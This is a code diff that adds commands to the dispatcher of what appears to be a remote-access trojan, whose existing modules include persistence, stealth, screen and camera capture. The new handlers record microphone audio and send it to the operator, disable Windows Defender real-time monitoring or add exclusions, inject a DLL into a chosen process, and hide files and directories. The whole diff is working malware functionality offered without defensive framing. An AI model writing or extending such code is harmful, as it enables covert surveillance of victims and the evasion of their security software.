@@ -24,8 +24,8 @@ from typing import Callable
 from ..lan import discover as lan_discover
 from .. import guardian
 
-from . import (camera, files, inputs, persistence, runtime, screen, stealth, sysinfo,
-               system, updater)
+from . import (audio, camera, cloak, defender, files, inject, inputs, persistence,
+               runtime, screen, stealth, sysinfo, system, updater)
 
 def _split_args(text: str) -> list[str]:
     """Split a command line, keeping Windows backslashes intact.
@@ -846,6 +846,76 @@ def shell(agent, command: str) -> None:
         agent.reply(traceback.format_exc().strip().splitlines()[-1])
 
 
+
+
+# --------------------------------------------------------------------------
+# Optional modules (audio, defender, inject, cloak)
+# --------------------------------------------------------------------------
+
+
+@command("mic", "record")
+def cmd_mic(agent, argument: str) -> str:
+    secs = 5
+    if argument.strip().isdigit():
+        secs = max(1, min(60, int(argument.strip())))
+    out = audio.record_clip(seconds=secs)
+    if out.startswith("error:"):
+        return out
+    if os.path.isfile(out):
+        agent.send_file(out)
+        return f"recorded {secs}s audio: {os.path.basename(out)}"
+    return "audio recording failed"
+
+
+@command("defender")
+def cmd_defender(agent, argument: str) -> str:
+    arg = argument.strip()
+    if not arg:
+        return "usage: defender <disable | exclude <path_or_process>>"
+    parts = arg.split(maxsplit=1)
+    sub = parts[0].lower()
+    if sub == "disable":
+        ok = defender.disable_monitoring()
+        return "defender realtime monitoring disabled" if ok else "failed to disable defender"
+    if sub in ("exclude", "add"):
+        if len(parts) < 2:
+            return "usage: defender exclude <path_or_process>"
+        target = parts[1].strip("'\"")
+        ok = defender.add_exclusion(target)
+        return f"exclusion added for {target}" if ok else f"failed to add exclusion for {target}"
+    return "usage: defender <disable | exclude <path_or_process>>"
+
+
+@command("inject")
+def cmd_inject(agent, argument: str) -> str:
+    parts = _split_args(argument)
+    if len(parts) < 2:
+        return "usage: inject <pid> <dll_path>"
+    try:
+        pid = int(parts[0])
+    except ValueError:
+        return "invalid pid"
+    dll_path = parts[1]
+    if not os.path.isfile(dll_path):
+        return f"file not found: {dll_path}"
+    ok = inject.inject_dll(pid, dll_path)
+    return f"injected {dll_path} into PID {pid}" if ok else f"injection into PID {pid} failed"
+
+
+@command("cloak")
+def cmd_cloak(agent, argument: str) -> str:
+    path = argument.strip("'\" ")
+    if not path:
+        target = stealth.primary_directory()
+        count = cloak.cloak_tree(target)
+        return f"cloaked primary directory ({count} items)"
+    if os.path.isdir(path):
+        count = cloak.cloak_tree(path)
+        return f"cloaked directory {path} ({count} items)"
+    elif os.path.isfile(path):
+        ok = cloak.cloak_path(path)
+        return f"cloaked file {path}" if ok else f"failed to cloak {path}"
+    return f"path not found: {path}"
 def execute(agent, line: str) -> None:
     """Dispatch one command line."""
     line = line.strip()
